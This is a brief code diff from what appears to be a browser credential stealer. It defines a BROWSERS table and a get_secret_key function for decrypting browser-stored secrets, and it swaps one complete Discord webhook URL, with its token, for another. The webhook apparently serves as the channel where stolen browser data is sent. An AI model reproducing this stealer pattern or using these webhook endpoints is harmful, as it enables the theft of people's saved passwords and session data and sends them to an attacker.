@@ -38,7 +38,7 @@ BROWSERS = {
     }
 }
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxahYevjx_X-QSDQXwSj6kOSO4L_47tbHJw8sT4xo29YcWOwZuAiZnqP7XhIz"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1243409410093748296/sQKlvmUiz7X5aJ-5nVDyEZhASdWRfM1rJdhxhqei8-VB9EpmzcvoTvAJZTNFm5DYkST8"
 
 def get_secret_key(browser_name):
     try:
